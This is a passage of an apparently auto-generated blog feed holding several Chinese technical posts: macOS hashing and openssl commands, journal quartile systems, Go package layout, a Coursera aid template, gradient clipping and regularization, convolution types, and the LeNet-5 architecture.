class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就可以在 Debug 页面找到 Launch Package 选项快乐地 debug go了。</p><h2 id="参考文章">参考文章</h2><ol type="1"><li><ahref="https://code.visualstudio.com/docs/setup/mac#_launching-from-the-command-line">RunningVisual Studio Code on macOS</a></li><li><ahref="https://blog.csdn.net/u010953692/article/details/103192550">VisualStudio Code for mac 设置代理 安装 go 开发环境_mixboot-CSDN 博客</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCI，JCR 分区与中科院分区</title>
      <link href="/blog/2022/10/16/academic/sci_jcr/"/>
      <url>/blog/2022/10/16/academic/sci_jcr/</url>
      
        <content type="html"><![CDATA[<h2 id="jcr-分区与中科院分区">JCR 分区与中科院分区</h2><p>JCR（Journal Citation Reports）分区是国际统一分区，也就是 SCI分区；中科院分区是我国特色分区，除了中国没人认中科院分区。</p><p>实际上，国内大部分的高校毕业要求、奖学金评选，以及科研单位的科研业绩奖励、职称评审等，均按照中科院分区进行加权计算。当然，也有些学校（如华南理工大学）表示要与国际接轨，统一使用科睿唯安JCR分区作为学科建设、科技奖励、授予学位成果等方面的评判标准，不再使用中科院的SCI 期刊分区标准。大陆之外一般采用 JCR 分区。</p><p>作者发表 SCI 论文时，经常会遇到分区的限定条件，比如中科院 1 区，JCRQ1等。虽然两个分区都有可能出现，但大多数时候，国内作者还是以中科院分区为准，如果没有特别要求以中科院分区小类为准，我们就默认以中科院分区大类标准为主。</p><p>JCR是国际上通用的一套，但是国内科研竞争太激烈，中科院就搞了个中国特色的分区体系。两者都是先把杂志的IF 从高到低排序</p><p>JCR 是前 25% 一区，后面二区到四区各占 25%；中科院是前 5%一区，5%~20%二区，20%~50% 三区，50%~最后四区。后者比前者严格太多，有些 JCR的一区杂志在中科院这边只能排到三区</p><p>虽然很多人可能不那么赞同，但来自中国的工作，在全世界来看是处于高于平均的水准的。所以，依靠JCR分区来评价工作的等级在中国不大合适，要求显得比较低了。所以国内中科院参考JCR进一步出了一个中科院的期刊分区，用来指导国内的科研成果评价。总体来看，无论是大领域还是小领域，中科院的分区要求都是比JCR 要高的。很多 JCRQ1的期刊，在相同领域里，在中科院的分区就变成了二区甚至三区的期刊。</p><p>影响因子高低并不能单纯反映一个学科领域的真实水平，本专业的顶级期刊同行都自己非常清楚。JCR和 SCI 分区都是人搞的，就会有非理性的偏向。</p><h2 id="分区写法">分区写法</h2><p>中科院分区和 JCR分区，虽然都是四个分区，但两个分区的写法是不同的。中科院分区分别是 1区、2 区、3 区、4 区。JCR,SCI 分区分别是 Q1、Q2、Q3、Q4。</p><h2 id="查找期刊的分区与影响因子">查找期刊的分区与影响因子</h2><ol type="1"><li><p>Web of Science 上查找期刊的名字，可以显示出期刊的 JCR与影响因子</p><p>SCI 指定的 JCR 分区门槛低，按照最新因子，如前 20% 就是一区了中科院的分区门槛高，三年平均因子，前 5%才是一区</p></li><li><p>IEEE，ACM 在期刊主页也会该期刊的影响因子</p></li><li><p>Letpub 上也可查到影响因子与分区</p></li></ol><h2 id="期刊与会议">期刊与会议</h2><p>区分是期刊还是会议一般还是以关键字==conference，proceeding（会议），article、journal（期刊）为区分点。</p><p>会议一般 EI 收录，SCI 主要收录期刊</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sci </tag>
            
            <tag> jcr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac commands about hash and encryption</title>
      <link href="/blog/2022/10/11/linux/macos/mac_encryp_tools/"/>
      <url>/blog/2022/10/11/linux/macos/mac_encryp_tools/</url>
      
        <content type="html"><![CDATA[<h2 id="base64-编解码">base64 编解码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base64 a.txt</span><br><span class="line">base64 -d a.txt</span><br><span class="line">echo -n &quot;hello&quot;|base64</span><br><span class="line">echo -n &quot;aGVsbG8=&quot;|base64 -d</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ echo -n &quot;hello&quot; &gt; a.txt</span><br><span class="line">$ cat a.txt</span><br><span class="line">hello%</span><br><span class="line">$ cat a.txt|base64</span><br><span class="line">aGVsbG8=</span><br><span class="line">$ echo -n &quot;aGVsbG8=&quot;|base64 -d</span><br><span class="line">hello%</span><br></pre></td></tr></table></figure><h2 id="消息摘要">消息摘要</h2><p>下面以字符串 hello 和文件 a.txt 为例</p><blockquote><p>注意：<code>echo -n</code> 代表不发送换行符; 不带参数默认发送换行符。cat 默认会增加换行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5 a.txt</span><br><span class="line">md5 -s hello</span><br><span class="line"></span><br><span class="line">shasum -a 1/256/512 a.txt</span><br><span class="line">echo -n &quot;hello&quot;|shasum -a 1/256/512</span><br></pre></td></tr></table></figure><p>Linux 下有 md5sum</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5sum a.txt</span><br><span class="line">echo -n 123456 | md5sum</span><br></pre></td></tr></table></figure><h2 id="openssl">openssl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">openssl md5 a.txt</span><br><span class="line">echo -n &quot;hello&quot;|openssl md5</span><br><span class="line"></span><br><span class="line">openssl sha1/256/512 a.txt</span><br><span class="line">echo -n &quot;hello&quot;|openssl sha1/256/512</span><br><span class="line"></span><br><span class="line">echo -n &quot;hello&quot;|openssl base64</span><br><span class="line">echo -n &quot;aGVsbG8=&quot;|openssl base64 -d</span><br></pre></td></tr></table></figure><p>AES/DES3 加密解密</p><p>AES 有五种加密模式：CBC、ECB、CTR、OCF、CFB，以 CBC加密模式为例，对明文 “plaintext”进行加密，结果以 base64编码格式输出，可以加 <code>-k</code>选项指定明文密钥，也可以直接回车按提示输入密钥。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;plaintext&quot;|openssl aes-128-ecb -base64</span><br></pre></td></tr></table></figure><p>对明文 ‘plaintext’ 进行 triple-DES 加密，使用密钥 123456，输出结果以base64 编码格式输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;plaintext&#x27; |openssl des3 -k 123456 -base64</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS 使用小技巧</title>
      <link href="/blog/2022/09/16/linux/macos/mac_skills/"/>
      <url>/blog/2022/09/16/linux/macos/mac_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="mac-compress-_macosx-文件夹">MAC compress _MACOSX 文件夹</h2><p>macOS 在压缩文件夹时，会自动生成并加入 <code>_MACOSX</code>文件夹作为一些缓存，该文件夹在 MACOS 上看不到，在 windows可以看得到。</p><p>删除方式: <a href="https://sspai.com/post/44953">如何删除 macOS压缩包中的隐藏文件 | 一日一技 - 少数派</a> zip 的几行命令写入了automator, 右键-service 运行净化 zip，等待弹窗提示即可。</p><h2 id="mac-preview-多标签打开">Mac preview 多标签打开</h2><p>system preference -&gt; General -&gt; Perfer tabs [选项] when openingdocument</p><p>选项处选择 “always”</p><h2 id="tmux">tmux</h2><p>开启 tmux 鼠标滚动：<ahref="https://superuser.com/questions/209437/how-do-i-scroll-in-tmux">Howdo I scroll in tmux? - Super User</a></p><h2 id="lsof">lsof</h2><p>netstat： <code>netstat -tnl</code> 查看开放的端口<code>netstat -aux</code> 查看多少个网络连接</p><p>使用 lsof 代替 Mac OS X 中的 netstat 查看占用端口的程序关闭监听某个端口的程序：<code>kill -9 $(lsof -i:20002|awk '&#123;print $2&#125;'|sed -n 2p)</code></p><h2 id="参考资料">参考资料</h2><p><ahref="https://tonydeng.github.io/2016/07/07/use-lsof-to-replace-netstat/">使用lsof 代替 Mac OS X 中的 netstat 查看占用端口的程序</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> macos </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Golang 包和项目结构</title>
      <link href="/blog/2022/08/16/programming/go/go_package/"/>
      <url>/blog/2022/08/16/programming/go/go_package/</url>
      
        <content type="html"><![CDATA[<h1 id="go-包概述">Go 包概述</h1><ul><li>包(package)是 Go语言中组织单元.包是逻辑上的分组.而物理上的分组是不同的文件夹,文件夹和包一般是对应的</li><li>把多个文件放入同一个文件夹中,这些文件就是在同一个包中.</li><li>虽然允许源码文件的 package 和文件夹名不同但是最终编译后都会把文件的package 编译成文件夹名称.所以为防止错误最好把文件的 package和文件夹名称设置成相同的</li><li>一个 Go 语言项目必须要有 main包,其他自定义名称的包个数任意,根据自己的需求即可.</li><li>Go 语言在寻找包时会从 GOPATH/src 路径中寻找包,如果不存在去GOROOT/src(Go 语言标准库源码所在文件夹)下找</li><li>不同包下资源可以相互访问,在导入其他包后,可以访问包下首字母大写的内容</li><li>同包下不同文件中全局资源可以随意访问</li></ul><h2 id="go-标准的项目结构">Go 标准的项目结构</h2><ul><li>在实际开发中不可能只有一个 main 包,更不可能就只有一个.go 文件.</li><li>不同级别大小的项目中包和文件数量都不同</li><li>Go 语言中组织单元最大的为项目,项目下包含包,一个包可以有多个文件</li><li>包在物理层面上就是文件夹.同一个文件夹中多个文件的 package必须相同,一般 package 和所在文件夹名称相同</li><li>在 Goland 中创建标准 Go 项目</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 项目名</span><br><span class="line">--src//所有源代码都存放到这个文件</span><br><span class="line">--文件夹  //文件夹一般为包名称</span><br><span class="line">--xx.go//源码文件</span><br><span class="line">--mm.go//源码文件</span><br><span class="line">--文件夹</span><br><span class="line">--xx.go</span><br><span class="line">--main.go//主函数所在文件,名称任意,注意main.go在项目根目录</span><br><span class="line">--bin 存放小工具</span><br><span class="line">--pkg 系统编译后生成的内容//自动生成,不需要创建</span><br></pre></td></tr></table></figure><h2 id="自定义包">自定义包</h2><ul><li><p>新建项目后在项目下新建 src 文件夹,在 src 文件夹中新建 demo文件</p></li><li><p>在 demo 文件中新建 demo1.go 和 demo2.go 文件</p></li><li><p>demo1.go 文件源码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo<span class="comment">//包为demo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;执行demo1&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>demo2.go 文件源码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo<span class="comment">//包为demo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Demo2</span><span class="params">()</span></span>  &#123;<span class="comment">//函数名大写才能被其他包访问</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;执行demo2&quot;</span>)</span><br><span class="line">    demo1()<span class="comment">//同包下内容任意访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在项目根目录下新建 main.go,源码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;demo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    demo.Demo2()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>coursera 申请助学金模版</title>
      <link href="/blog/2022/08/16/misc/coursera_templates/"/>
      <url>/blog/2022/08/16/misc/coursera_templates/</url>
      
        <content type="html"><![CDATA[<h2 id="您为何申请助学金">您为何申请助学金？</h2><p>I am very interested in this course. I believe that this course caneffectively help me in the field of machine learning and make myprofessional skills more perfect.</p><p>However, since I am now a full-time student who does not have a job,I can't afford the extra monthly study fee by relying on scholarshipsand daily part-time tuition and living expenses.</p><p>I graduated with a bachelor's degree from UESTC(University ofElectronic Science and Technology of China) in China. Now, I am a PhD inSJTU (Shanghai JiaoTong University) in China. The ability to learn,adapt, communicate, and organize is excellent. I believe that there willbe achievements in society in the future. I have also been activelyrepaying the society. I have volunteered for a year in the Women andChildren's Hospital to participate in the rehabilitation of autisticangels. I also actively participate in various educationalactivities.</p><p>I am determined to complete this course, please give me thisopportunity.</p><h2id="您所选的课程将如何帮助您实现目标">您所选的课程将如何帮助您实现目标</h2><p>I am a student majoring in computer science, the course involvesmachine learning, math etc.</p><p>During the learning process, I gradually discovered the need to digdeep into artificial intelligence, which can give enterprises a view oftrends in customer behavior and business operational patterns, as wellas supports the development of new products When it comes time to work.And this course can help me start with basic programming, better handlebig data and analyze trends through programming.</p><p>In addition, Machine learning has gradually become a must-have skillin computer science-related job requirements. After studying thiscourse, I can better enrich my professional skills and become aprofessional with not only theoretical knowledge but also operationalability. I hope that after graduation, I can find a career related tomachine learning, mainly in artificial intelligence and machinelearning.</p><p>I would appreciate it if you could give me an opportunity forlearning this course.</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Regularization in Machine Learning</title>
      <link href="/blog/2022/07/15/ml/ml_regularization/"/>
      <url>/blog/2022/07/15/ml/ml_regularization/</url>
      
        <content type="html"><![CDATA[<p>在机器学习训练过程中,如果梯度/权重变得过大,甚至变成 nan, 或者 loss过大、异常跳跃,甚至变成 nan, 便出现了所谓的梯度爆炸问题.梯度爆炸问题是指在训练过程中梯度范数的大幅度增加,从而导致网络无法从训练数据中学习,梯度下降无法执行,学不到最优解.</p><p>梯度爆炸的识别:</p><p>准确度上不去,</p><ol type="1"><li>输出 loss 值, 看 loss 是否过大、有异常跳跃情况</li><li>输出梯度的范数, 看是否呈指数增长</li><li>调试看权重/梯度的大小</li></ol><h2 id="solution-to-exploding-gradients">Solution to explodinggradients</h2><p>梯度爆炸的基本解决方法有 3 种:</p><ol type="1"><li><p>L1 Regularization</p></li><li><p>L2 Regularization</p><p>L2 Regularization 相当于对网络中的损失函数应用 weight decay</p></li><li><p>Gradient clipping</p></li></ol><p>对于模型权重系数 求解是通过最小化目标函数实现的。正则化方法通过在Loss 函数中加惩罚项来防止 overfitting。L1 正则化和 L2正则化,二者分别相当于在 Loss 函数中增加权重的 L1 范数和 L2 范数。</p><p><span class="math display">\[\begin{aligned}&amp;l_1: \Omega(w)=\|w\|_1=\sum_i\left|w_i\right| \\&amp;l_2: \Omega(w)=\|w\|_2^2=\sum_i w_i^2\end{aligned}\]</span></p><p>加了之后的权重优化公式如下：</p><p><span class="math display">\[\begin{aligned}\mathbf{w}^* &amp;=\arg \min _{\mathbf{w}}\sum_j\left(t\left(\mathbf{x}_j\right)-\sum_i w_ih_i\left(\mathbf{x}_j\right)\right)^2+\lambda\sum_{i=1}^k\left|w_i\right| \\\mathbf{w}^* &amp;=\arg \min _{\mathbf{w}}\sum_j\left(t\left(\mathbf{x}_j\right)-\sum_i w_ih_i\left(\mathbf{x}_j\right)\right)^2+\lambda \sum_{i=1}^k w_i^2\end{aligned}\]</span></p><p>两个正则项区别：</p><p>L1norm：对输入特征进行过滤（一部分特征保留，一部分特征移除），会把不重要的特征直接置零，产生稀疏性效果</p><p>L2 norm：</p><ol type="1"><li>控制特征值的范围，使其不要过大，产生平滑效果</li><li>L2 计算方便，而 L1 在特别是非稀疏向量上的计算效率就很低；</li><li>L2 Norm 对大数的惩罚更大，对 outlier 更敏感，因为使用 L2 Norm求出来的解是比较均匀的，而 L1 Norm 常常产生稀疏解。</li></ol><p>实际应用过程中，L1 norm 几乎没有比 L2 norm 表现好的时候，优先使用 L2norm 是比较好的选择。</p><h2 id="gradient-clipping">Gradient clipping</h2><p>而对权重/梯度进行约束裁剪,避免模型越过最优点,是解决梯度爆炸的有效方法之一.</p><p>梯度裁剪是通过在网络反向传播过程中,将梯度裁剪到一个阈值,通过裁剪的梯度更新权重,实现对权重更新的缩放，从而降低溢出的可能。</p><p>梯度裁剪主要分为两种: Clipping-by-value, Clipping-by-norm</p><h2 id="gradient-clipping-by-value">Gradient clipping-by-value</h2><p>按照值裁剪: 定义 a minimum clip value 和 a maximum clip value,将超出这个范围的梯度, 裁剪为对应阈值.(‖gradient‖是梯度的范数)</p><p>伪代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gradient ← ∂C/∂W</span><br><span class="line">if ‖gradient‖ ≥ max_threshold or ‖gradient‖ ≤ min_threshold then</span><br><span class="line"> gradient = threshold (accordingly)</span><br></pre></td></tr></table></figure><h2 id="gradient-clipping-by-norm">Gradient clipping-by-norm</h2><p>clipping-by-norm 的思想类似于 clipping-by-value。不同之处在于,我们通过将梯度的单位向量与阈值相乘来裁剪梯度。因为 g/‖g‖ 是一个单位向量,在重新缩放之后, 使得梯度的 L2 norm 小于等于预设的 clip_norm.</p><p>伪代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g ← ∂C/∂W</span><br><span class="line">if ‖g‖ ≥ threshold then</span><br><span class="line">   g = threshold * g/‖g‖</span><br><span class="line">% or</span><br><span class="line">% g /= max(1, ‖g‖/threshold)</span><br></pre></td></tr></table></figure><h2 id="深度学习框架">深度学习框架</h2><p>通常在 backward 得到梯度之后，step() 更新之前，使用梯度剪裁,继而进行网络更新的过程。</p><h3 id="tensorflow">tensorflow</h3><p>在 tf1.0 中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Compute gradients.</span><br><span class="line">gradients = tape.gradient(loss, trainable_variables)</span><br><span class="line"></span><br><span class="line"># two methods, use one of them is enough.</span><br><span class="line"># Clip-by-value on all trainable gradients</span><br><span class="line">gradients = [(tf.clip_by_value(grad, clip_value_min=-1.0,clip_value_max=1.0)) for grad in gradients]</span><br><span class="line"></span><br><span class="line"># clip-by-norm</span><br><span class="line">gradients = [(tf.clip_by_norm(grad, clip_norm=2.0)) for grad in gradients]</span><br></pre></td></tr></table></figure><p>在 tf2 中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from tensorflow.keras import optimizers</span><br><span class="line">sgd = optimizers.SGD(lr=0.01, clipvalue=0.5)</span><br></pre></td></tr></table></figure><blockquote><p><code>clipnorm</code> : float or None. If set, clips gradients to amaximum norm. <code>clipvalue</code>: float or None. If set, clipsgradients to a maximum value.</p></blockquote><h3 id="pytorch">PyTorch</h3><p>因为 PyTorch是将梯度存储在参数中,所以这里直接将模型参数传到裁剪函数中.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loss.backward()</span><br><span class="line"></span><br><span class="line"># Gradient Norm Clipping</span><br><span class="line">#nn.utils.clip_grad_norm_(model.parameters(), max_norm=2.0, norm_type=2)</span><br><span class="line">#Gradient Value Clipping</span><br><span class="line">nn.utils.clip_grad_value_(model.parameters(), clip_value=1.0)</span><br><span class="line"></span><br><span class="line">optimizer.step()</span><br></pre></td></tr></table></figure><h2 id="weight-constraint">weight constraint</h2><p>更加直接地,还可以约束权重的大小.</p><p>torch.clamp 可实现 tensor 一定范围约束</p><h2 id="ealy-stopping-缓解过拟合">ealy stopping 缓解过拟合</h2><p>earlystopping，每个神经元激活函数在不同数值区间的性能是不同的，值较小时为线性区，适当增大后为非线性区，过度增大则为饱合区（梯度消失）。初始化时，神经元一般工作在线性区（拟合能力有限），训练时间增大时，部分值会增大进入非线性区（拟合能力提高），但是训练时间过大时，就会进入饱合区，神经元就“死掉”。所以应该在适当时间内就stopping 训练。</p><h2 id="推荐文章">推荐文章</h2><p><ahref="https://machinelearningmastery.com/introduction-to-weight-constraints-to-reduce-generalization-error-in-deep-learning/">AGentle Introduction to Weight Constraints in Deep Learning</a></p><p><a href="https://cs231n.github.io/neural-networks-2/#reg">CS231nConvolutional Neural Networks for Visual Recognition</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1D-3D 卷积简介</title>
      <link href="/blog/2022/07/15/ml/cnn/1d_3d_convolution/"/>
      <url>/blog/2022/07/15/ml/cnn/1d_3d_convolution/</url>
      
        <content type="html"><![CDATA[<h2 id="d-卷积">1D 卷积</h2><p>一维卷积主要用于对只有一个维度的时间序列提取特征，比如信号、股价、天气、文本以及自然语言处理领域。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16658826960765.jpg"alt="16658826960765" /><figcaption aria-hidden="true">16658826960765</figcaption></figure><p>如上图，图中的输入的数据维度为 8，过滤器的维度为 5, 步长 stride 为 1,则卷积后输出的数据维度为 8−5+1=4。</p><h2 id="d-卷积-1">2D 卷积</h2><p>2D卷积是提取的单张静态图像的空间特征，然后同神经网络结合之后完成图像的分类、检测等计算机视觉方面的任务。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/2d_20221016.gif"alt="2d_20221016" /><figcaption aria-hidden="true">2d_20221016</figcaption></figure><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16658827558899.jpg"alt="16658827558899" /><figcaption aria-hidden="true">16658827558899</figcaption></figure><p>如上图中的输入的数据维度为（14×14），过滤器大小为 5×5，步长 stride 为1, 二者做卷积，输出的数据维度为（10×10）即（14−5+1=10）。</p><h2 id="d-卷积-2">3D 卷积</h2><p>2D 卷积的 CNN可以较好地处理单张图片，但是对视频，即多帧图像就会束手无策，因为 2D卷积没有考虑到图像之间的时间维度上的物体运动信息，即光流场。因此，为了能够对视频进行特征，以便用来分类等任务，提出了3D 卷积，在卷积核中加入时间维度。下图就很好的说明了 2D 卷积和 3D卷积之间的差异。很明显，我们可以直观的发现 3D CNN提取的是三维度的方体特征。</p><p>3 维卷积，一个 3<em>3</em>3 的卷积核在立方体上进行卷积，得到输出。<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/3d_cnn.gif"alt="3d_cnn" /></p><p>如下图，假设输入数据的大小为（a1×a2×a3），过滤器大小为 fff，三维卷积最终的输出为(a1−f+1)×(a2−f+1)×(a3−f+1)。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16658852477248.jpg"alt="16658852477248" /><figcaption aria-hidden="true">16658852477248</figcaption></figure><p>补充：3D 卷积里面也分为单通道和多通道。 针对单通道，与 2D卷积不同之处在于，输入的图像多了一个 depth 维度，即输入为(1, depth,height, width)，卷积核也多了一个 k_d 维度，因此卷积核在输入 3D图像的空间维度（height 和 width 维）和 depth维度上均进行滑窗操作，每次滑窗与 (k_d, k_h, k_w) 窗口内的 values进行相关操作，得到输出 3D 图像中的一个 value。 针对多通道，输入大小为(3,depth, height, width)，则与 2D 卷积的操作一样，每次滑窗与 3 个 channels上的 (k_d, k_h, k_w) 窗口内的所有 values 进行相关操作，得到输出 3D图像中的一个 value。</p><h2 id="多通道卷积与-3d-卷积">多通道卷积与 3D 卷积</h2><p>多通道卷积不同的通道上的卷积核的参数是不同的，而 3D卷积则由于卷积核本身是 3D的，所以这个由于“深度”造成的看似不同通道上用的就是同一个卷积，权重共享嘛。</p><p>总之，多了一个深度通道，这个深度可能是视频上的连续帧，也可能是立体图像中的不同切片。</p><p>3D 卷积的应用</p><p>3D卷积就是多了一个深度通道，而这个深度通道可能是视频上的连续帧，也可能是立体图像中的不同切片，所以从应用上来说，主要就是两大主要方向:视频分类与图像切割</p><h2 id="参考">参考</h2><p><ahref="https://www.cnblogs.com/szxspark/p/8445406.html">卷积神经网络（CNN）之一维卷积、二维卷积、三维卷积详解- szx_spark - 博客园</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNN </tag>
            
            <tag> convolution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 LeNet5 学 CNN</title>
      <link href="/blog/2022/07/15/ml/cnn/learn_cnn_lenet/"/>
      <url>/blog/2022/07/15/ml/cnn/learn_cnn_lenet/</url>
      
        <content type="html"><![CDATA[<p>LeNet-5 comprises seven layers, not counting the input, all of whichcontain trainable parameters (weights). The input is a 32x32 pixelgrayscale image.</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16696231411578.jpg"alt="16696231411578" /> The naming convention used by the authors:</p><ul><li>Cx — convolution layer,</li><li>Sx — subsampling (pooling) layer,</li><li>Fx — fully-connected layer,</li><li>x — index of the layer.</li></ul><p>The formula for calculating the output size of the convolutionallayer.</p><p><span class="math display">\[(W−F+2P)/S+1\]</span></p><p>, where W is the input height/width (normally the images are squares,so there is no need to differentiate the two), F is the filter/kernelsize, P is the padding, and S is the stride.</p><p>Description of the LeNet-5 architecture layer by layer.</p><ol type="1"><li><p><strong>Layer 1 (C1)</strong>: convolutional layer</p><p><strong>Input</strong>: 1x32x32 pixel (in_channel=1 means that thegrayscle image only have one channel)</p><p><strong>Process</strong>: 6 kernels/filters/feature maps of size 5x5and the stride is 1 If in_channel=3. means that the image have 3channels, like RGB image. The kernel will extract 3 channels, that is,for each channel, there are 6 kernels of size 5x5, which is 6x3 tensorsof 5x5</p><p><strong>Ouput</strong>: 1x28x28x6 According to the formula:<code>(32-5+2*0)/1+1=28</code>, and each kernel will extracts achannel.</p></li><li><p><strong>Layer 2 (S2)</strong>: subsampling/pooling layer</p><p>The subsampling layer in the original architecture was a bit more<strong>complex than the traditionally used max/average poolinglayers</strong>. I will quote [1]: “ The four inputs to a unit in S2 areadded, then multiplied by a trainable coefficient, and added to atrainable bias. The result is passed through a sigmoidal function.”. Asa result of non-overlapping receptive fields, the input to this layer ishalved in size (14×14×6).】</p><p>Input: 28x28x6 Proccess: avg or max pooling layer, the stride is 2Output： 14x14x6</p></li><li><p><strong>Layer 3 (C3)</strong>: The second convolutional layerwith the same configuration as the first one, however, this time with 16filters. The output of this layer is 10×10×16.</p></li><li><p><strong>Layer 4 (S4)</strong>: The second pooling layer. Thelogic is identical to the previous one, but this time the layer has 16filters. The output of this layer is of size 5×5×16.</p><p>Ouput: 5×5×16 池化层是当前卷积神经网络中常用组件之一，它最早见于LeNet 一文，称之为 Subsample。自 AlexNet 之后采用 Pooling命名。池化层是模仿人的视觉系统对数据进行降维，用更高层次的特征表示图像。</p><p>实施池化的目的：(1) 降低信息冗余；(2)提升模型的尺度不变性、旋转不变性；(3) 防止过拟合。池化层的常见操作包含以下几种：最大值池化，均值池化，随机池化，中值池化，组合池化等。</p><p>池化的超级参数包括过滤器大小和步幅，常用的参数值为，，应用频率非常高，其效果相当于高度和宽度缩减一半。最大池化时，往往很少用到超参数padding，最常用的值是 0</p><p>最大池化只是计算神经网络某一层的静态属性，池化过程中没有需要学习的参数。执行反向传播时，反向传播没有参数适用于最大池化。</p></li><li><p><strong>Layer 5 